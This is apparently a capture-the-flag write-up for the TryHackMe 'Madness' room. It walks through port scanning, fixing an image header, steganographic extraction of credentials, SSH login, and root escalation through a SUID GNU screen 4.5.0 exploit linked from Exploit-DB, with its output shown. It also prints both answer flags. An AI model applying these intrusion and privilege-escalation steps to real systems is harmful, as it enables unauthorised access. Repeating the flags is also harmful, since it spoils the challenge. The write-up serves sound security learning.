# Madness

Will you be consumed by Madness?

Note from creator: Please note this challenge does not require SSH brute forcing.

Room URL: https://tryhackme.com/room/madness

---

Only two open ports.

```
$ nmap -sC -sV 10.10.150.122
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 20:59 CEST
Nmap scan report for 10.10.150.122
Host is up (0.051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Task 1

1. user.txt

Let's see what's possibly there on the webserver.

```
$ gobuster dir -w ~/projects/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.150.122/ -x php,htm,txt,html,py
```

Just an `index.php` file. I can see a broken jpg image in the top left corner..
Opening it in any picture viewer doesn't help. Hexdump shows a PNG header but it
has a JPG file extension. Clearly it won't open like this. What about changing
the header to be JPG? Thanks to [Gary
Kessler](https://www.garykessler.net/library/file_sigs.html) this is an easy
job. By replacing the first 8 bytes (PNG) with the default bytes for JPG/JPEG
we are returned a working image and it shows a hidden directory.
`89 50 4E 47 0D 0A 1A 0A` became `FF D8 FF E0 00 10 4A 46 49 46`

A page is returned with a hint in its source:

```html
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->
```

Considering it's a PHP page again, let's append `?secret=n` to the URI. Where
`n` is in range of `0` and `99`. Let's run a simple curl against this. The magic
number seems to be 73.

```html
<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
```

Running steghide against the fixed JPG file we retrieve a file `hidden.txt`
which contains a username: `wbxre` which looks to be ROT13 encoded. A quick
search returns this to be `joker`.

So does this combination of username and password help us log in to the box?
Nope. To get past this point I had to look at someone else's writeup. Seems the
image embedded in the task contains some steganography too.

```bash
$ wget https://i.imgur.com/5iW7kC8.jpg
$ steghide extract -sf 5iW7kC8.jpg
$ cat password.txt
```

There's a working SSH password in there! After SSH'ing into the box, we can
grab the flag:

```
joker@ubuntu:~$ cat user.txt
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

2. root.txt

So now that we're on the box, we should try and find a way up to root. With
`find` I could find some binaries with the suid flag owned by root:

```bash
$ find / -perm /4000 -user root
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
```

Here the `screen-4.5.0` and `screen-4.5.0.old` binaries are interesting as
they can be used for local privilege escalation... Let's try to use this
[example](https://www.exploit-db.com/exploits/41154)

And hey presto, we're root.

```
joker@ubuntu:/dev/shm$ chmod +x screenroot.sh
joker@ubuntu:/dev/shm$ ./screenroot.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
```

```
# cat /root/root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```
